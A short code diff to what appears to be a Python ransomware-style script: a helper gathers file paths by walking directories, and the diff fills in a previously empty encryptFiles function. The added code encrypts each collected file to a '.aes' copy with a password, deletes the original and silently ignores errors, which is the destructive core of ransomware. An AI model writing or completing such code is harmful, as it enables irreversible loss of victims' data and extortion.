@@ -16,6 +16,10 @@ def find_files():
                 allFiles.append(os.path.join(root, names))
     return allFiles
 
-def encryptFiles(files):
+def encryptFiles(files, password):
     for file in files:
-        return
+        try:
+            encryptFile(file, file+".aes", password, 64 * 1024)
+            os.remove(file)
+        except:
+            pass
